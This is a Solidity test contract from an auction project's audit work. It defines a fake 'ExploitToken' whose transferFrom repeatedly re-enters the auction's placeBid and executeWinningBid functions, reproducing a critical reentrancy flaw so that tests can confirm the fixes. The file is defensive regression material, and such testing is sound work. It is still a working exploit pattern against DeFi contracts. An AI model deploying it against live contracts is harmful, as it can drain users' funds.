pragma solidity ^0.8.12;

import {IAqueductV1Auction} from "../interfaces/IAqueductV1Auction.sol";

/**
 * @notice Example contract used in audit to exploit auction contract via reentrancy, used in auction tests to check our fixes
 *
 * issue from audit: Reentrancy with a fake token in AqueductV1Auction | critical
 */
contract ExploitToken {
    uint256 counter;
    IAqueductV1Auction auction;
    address pair;
    bool isPlaceBid;

    mapping(address => uint) public balanceOf;

    constructor(bool _isPlaceBid) {
        isPlaceBid = _isPlaceBid;
    }

    function initialize(address _auction, address _pair) public {
        auction = IAqueductV1Auction(_auction);
        pair = _pair;
    }

    function mint(uint amount) external {
        balanceOf[msg.sender] += amount;
    }

    function transfer(address dst, uint256 wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint256 wad) public returns (bool) {
        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        if (msg.sender == address(auction) && pair == dst) {
            uint256 count = counter++;

            // this contract tests reentrancy on both of these functions, uses constructor arg to differentiate
            if (isPlaceBid) {
                auction.placeBid(address(this), pair, 100, 100, type(uint256).max);
            } else {
                // skipping first swap in placeBid()
                if (count > 0) {
                    // reenter
                    if (count < 11) {
                        auction.executeWinningBid(pair);
                    }
                }
            }
        }

        return true;
    }

    // pretend to be a super token
    function getAgreementStateSlot(
        address agreementClass,
        address account,
        uint256 slotId,
        uint dataLength
    ) external view returns (bytes32[] memory slotData) {
        bytes32 slot = keccak256(abi.encode("AgreementState", agreementClass, account, slotId));
        slotData = loadData(slot, dataLength);
    }

    function loadData(bytes32 slot, uint dataLength) internal view returns (bytes32[] memory data) {
        data = new bytes32[](dataLength);
        for (uint j = 0; j < dataLength; ++j) {
            bytes32 d;
            assembly {
                d := sload(add(slot, j))
            }
            data[j] = d;
        }
    }
}
